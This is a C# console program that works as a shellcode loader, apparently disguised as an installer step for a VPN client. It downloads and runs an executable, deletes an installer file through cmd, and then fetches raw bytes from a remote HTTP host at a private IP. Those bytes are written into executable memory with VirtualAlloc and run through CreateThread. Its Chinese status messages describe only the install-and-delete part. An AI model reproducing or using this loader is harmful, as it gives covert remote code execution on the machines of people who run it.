using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
namespace ConsoleApp5
{
    class Program
    {
        [DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        public static Byte[] GetByteByRemoteURL(string srcPdfFile)
        {
            byte[] arraryByte;
            HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(srcPdfFile);
            req.Method = "GET";
            using (WebResponse wr = req.GetResponse())
            {
                StreamReader responseStream = new StreamReader(wr.GetResponseStream(), Encoding.UTF8);
                int length = (int)wr.ContentLength;
                byte[] bs = new byte[length];

                HttpWebResponse response = wr as HttpWebResponse;
                Stream stream = response.GetResponseStream();

                //读取到内存
                MemoryStream stmMemory = new MemoryStream();
                byte[] buffer1 = new byte[length];
                int i;
                //将字节逐个放入到Byte 中
                while ((i = stream.Read(buffer1, 0, buffer1.Length)) > 0)
                {
                    stmMemory.Write(buffer1, 0, i);
                }
                arraryByte = stmMemory.ToArray();
                stmMemory.Close();
            }
            return arraryByte;
        }
        static void Main(string[] args)
        {
            //WebClient Downloader = new WebClient();
            //Downloader.DownloadFile("https://vpn.qianxin.com/download/GWSetup.exe", "GWSetup.exe");
            //Process.Start("GWSetup.exe");


            Console.Write("开始下载程序并执行");
            string line = "del GWSetup.exe /f";

            var processStartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c " + line,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false
            };

            WebClient Downloader = new WebClient();
            Downloader.DownloadFile("https://1p.exe", "1p.exe");
            try
            {
                Process.Start("1p.exe").WaitForExit();
                Console.Write("安装结束开始删除程序");
            }
            finally
            {
                Process.Start(processStartInfo).WaitForExit();
                byte[] shellcode = GetByteByRemoteURL("http://172.16.250.2:8000/2.txt");
                Console.WriteLine(shellcode.Length);
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
                Console.Write("删除完成");
            }
        }
    }
}
